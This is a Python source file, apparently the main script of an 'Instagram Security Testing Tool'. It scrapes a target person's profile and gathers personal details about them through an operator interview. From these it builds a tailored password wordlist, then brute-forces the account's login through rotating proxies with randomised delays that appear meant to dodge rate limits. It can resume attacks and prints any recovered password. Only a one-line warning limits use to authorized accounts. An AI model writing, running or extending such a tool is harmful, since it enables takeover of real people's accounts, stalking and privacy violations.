#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Security Testing Tool
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OSINT → Interview → AI Wordlist → Brute Force → Report

Usage:
    python3 igtool.py
"""

import os
import sys
from core.banner import (
    C, show_banner, clear, info, ok, warn, err,
    step, ask, yesno, menu,
)
from core.osint import OSINT
from core.interviewer import Interviewer
from core.wordlist import WordlistAI
from core.brute import BruteEngine
from core.api import InstagramAPI


def count_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for line in f if line.strip())
    except Exception:
        return 0


def main():
    clear()
    show_banner()

    # ── Target ────────────────────────────────────────
    print(f"{C.W}─── Target ───{C.E}\n")
    username = ask("Instagram username (@ or name)")
    if not username:
        err("Username required")
        sys.exit(1)
    username = username.strip().lstrip("@")

    output_dir = ask("Output directory", "output")
    os.makedirs(output_dir, exist_ok=True)

    proxy = ask("Proxy URL (ENTER to skip)", "")
    proxy_file = ask("Proxy list file (ENTER to skip)", "")

    # Verify account exists
    info(f"Checking @{username}...")
    api = InstagramAPI(proxy=proxy)
    exists = api.profile_exists(username)
    if exists is False:
        err(f"Account @{username} does not exist or is unreachable")
    elif exists:
        ok(f"Account @{username} exists ✓")
    else:
        warn(f"Could not verify @{username} — continuing anyway")

    # ── Main Menu ─────────────────────────────────────
    while True:
        choice = menu([
            "OSINT — Profile intelligence gathering",
            "WORDLIST — OSINT + Interview + Generate wordlist",
            "BRUTE FORCE — Test passwords",
            "FULL ATTACK — OSINT → Interview → Wordlist → Brute",
            "RESUME — Continue previous attack",
            "PROXY CHECK — Validate proxies",
            "EXIT",
        ], f"@ {username}")

        wl_path = os.path.join(output_dir, username, "wordlist.txt")
        hints = {}
        answers = {}
        found = None

        # ── 1: OSINT ────────────────────────────────
        if choice == 1:
            step(1, 1, "OSINT")
            bot = OSINT(username, output_dir, proxy)
            data = bot.scrape()
            if data:
                bot.print_summary()
                ok(f"Data saved → output/{username}/osint.json")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 2: WORDLIST ─────────────────────────────
        if choice == 2:
            step(1, 3, "OSINT")
            bot = OSINT(username, output_dir, proxy)
            data = bot.scrape()
            hints = bot.get_hints() if data else {"username": username}

            step(2, 3, "INTERVIEW")
            if yesno("Run interview?", default_yes=True):
                answers = Interviewer(username, hints, output_dir).run()
            else:
                answers = {
                    "username": username,
                    "full_name": hints.get("full_name", ""),
                    "osint_tokens": hints.get("bio_tokens", []),
                    "osint_years": hints.get("years", []),
                    "osint_phones": hints.get("phones", []),
                }

            step(3, 3, "WORDLIST")
            cnt = ask("Wordlist size", "18000")
            try:
                cnt_n = int(cnt)
            except ValueError:
                cnt_n = 18000

            ai = WordlistAI(answers, target_count=cnt_n)
            ai.generate()
            ai.save(wl_path)
            ok(f"Wordlist: {wl_path} ({ai.count} passwords)")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 3: BRUTE FORCE ──────────────────────────
        if choice == 3:
            if not os.path.isfile(wl_path):
                warn("No wordlist found")
                if yesno("Generate one now?"):
                    bot = OSINT(username, output_dir, proxy)
                    data = bot.scrape()
                    hints = bot.get_hints() if data else {"username": username}
                    if yesno("Run interview?"):
                        answers = Interviewer(username, hints, output_dir).run()
                    else:
                        answers = {
                            "username": username,
                            "full_name": hints.get("full_name", ""),
                            "osint_tokens": hints.get("bio_tokens", []),
                            "osint_years": hints.get("years", []),
                            "osint_phones": hints.get("phones", []),
                        }
                    ai = WordlistAI(answers)
                    ai.generate()
                    ai.save(wl_path)
                else:
                    wl_path = ask("Wordlist path")
                    if not os.path.isfile(wl_path):
                        err("File not found")
                        continue

            n = count_lines(wl_path)
            if n == 0:
                err("Wordlist is empty")
                continue

            print(f"\n{C.R}{C.W}  ⚠  You are about to test {n} passwords against @{username}{C.E}")
            print(f"{C.R}     Use ONLY on accounts you are authorized to test.{C.E}")
            if not yesno("Continue?", default_yes=False):
                warn("Aborted")
                continue

            dmin = ask("Min delay (seconds)", "3")
            dmax = ask("Max delay (seconds)", "5")
            try:
                dmin_f = float(dmin)
                dmax_f = float(dmax)
            except ValueError:
                dmin_f, dmax_f = 3.0, 5.0

            engine = BruteEngine(
                username, wl_path, output_dir,
                delay_min=dmin_f, delay_max=dmax_f,
                proxy=proxy, proxy_file=proxy_file,
            )
            found = engine.run()

            if found:
                print(f"\n{C.G}{'═' * 40}{C.E}")
                print(f"{C.G}  ✓ CREDENTIAL RECOVERED{C.E}")
                print(f"{C.G}{'═' * 40}{C.E}")
                print(f"  Username : {username}")
                print(f"  Password : {C.W}{found}{C.E}")
                print(f"  Saved to : output/{username}/found.txt")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 4: FULL ATTACK ──────────────────────────
        if choice == 4:
            step(1, 4, "OSINT")
            bot = OSINT(username, output_dir, proxy)
            data = bot.scrape()
            hints = bot.get_hints() if data else {"username": username}
            if data:
                bot.print_summary()

            step(2, 4, "INTERVIEW")
            if yesno("Run interview?"):
                answers = Interviewer(username, hints, output_dir).run()
            else:
                answers = {
                    "username": username,
                    "full_name": hints.get("full_name", ""),
                    "osint_tokens": hints.get("bio_tokens", []),
                    "osint_years": hints.get("years", []),
                    "osint_phones": hints.get("phones", []),
                }

            step(3, 4, "WORDLIST")
            ai = WordlistAI(answers)
            ai.generate()
            ai.save(wl_path)
            info(f"Generated {ai.count} passwords")

            n = ai.count
            print(f"\n{C.R}{C.W}  ⚠  You are about to test {n} passwords against @{username}{C.E}")
            if not yesno("Launch attack?", default_yes=False):
                warn("Attack skipped — wordlist saved")
                continue

            step(4, 4, "ATTACK")
            engine = BruteEngine(
                username, wl_path, output_dir,
                proxy=proxy, proxy_file=proxy_file,
            )
            found = engine.run()

            if found:
                print(f"\n{C.G}{'═' * 40}{C.E}")
                print(f"{C.G}  ✓ CREDENTIAL RECOVERED{C.E}")
                print(f"{C.G}{'═' * 40}{C.E}")
                print(f"  Username : {username}")
                print(f"  Password : {C.W}{found}{C.E}")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 5: RESUME ───────────────────────────────
        if choice == 5:
            progress = os.path.join(output_dir, username, "progress.json")
            if not os.path.isfile(progress):
                err("No progress file — nothing to resume")
                ask("Press ENTER to return")
                continue

            info("Resuming from checkpoint...")
            engine = BruteEngine(
                username, wl_path, output_dir,
                proxy=proxy, proxy_file=proxy_file,
                resume=True,
            )
            found = engine.run()

            if found:
                print(f"\n{C.G}  ✓ RECOVERED: {found}{C.E}")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 6: PROXY CHECK ──────────────────────────
        if choice == 6:
            from core.proxy import ProxyManager
            pm = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
            if pm.count == 0:
                warn("No proxies configured")
            else:
                info(f"Testing {pm.count} proxies...")
                alive = pm.validate_all()
                for p in pm._alive:
                    print(f"  {C.G}ALIVE{C.E}  {p['url']} ({p['latency']:.2f}s)")
                for p in pm._dead:
                    print(f"  {C.R}DEAD{C.E}   {p}")
                ok(f"{alive}/{pm.count} proxies alive")
            ask("\nPress ENTER to return")
            clear(); show_banner()
            continue

        # ── 7: EXIT ─────────────────────────────────
        if choice == 7:
            print(f"\n{C.C}  Goodbye!{C.E}\n")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.E}")
        sys.exit(0)
